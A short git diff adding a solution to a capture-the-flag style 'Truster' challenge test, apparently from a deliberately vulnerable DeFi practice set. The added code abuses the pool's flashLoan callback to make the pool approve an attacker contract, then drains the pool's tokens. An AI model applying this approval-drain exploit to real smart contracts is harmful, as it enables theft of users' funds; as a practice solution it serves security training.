@@ -29,6 +29,18 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+
+        const Robber = await ethers.getContractFactory('MaliciousReceiverUnstoppable', attacker);
+        const robber = await Robber.deploy(this.token.address, this.pool.address);
+
+
+        let abi = ["function approve(address spender, uint256 amount)"];
+        let iface = new ethers.utils.Interface(abi);
+        let data = iface.encodeFunctionData("approve", [robber.address, TOKENS_IN_POOL]);
+        await this.pool.flashLoan(0,attacker.address , this.token.address, data);
+        console.log(await this.token.allowance(this.pool.address, attacker.address));
+        await robber.loot(TOKENS_IN_POOL);
+        
     });
 
     after(async function () {
